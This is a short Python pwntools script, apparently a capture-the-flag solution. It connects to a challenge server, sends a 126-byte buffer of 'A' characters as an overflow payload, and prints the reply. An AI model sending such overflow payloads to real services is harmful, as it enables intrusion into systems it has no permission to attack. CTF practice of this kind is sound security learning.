from pwn import *

payload = 'A'*126
p = remote('chall.csivit.com', 30041)
print p.recv()
p.sendline(payload)
print p.recvall()
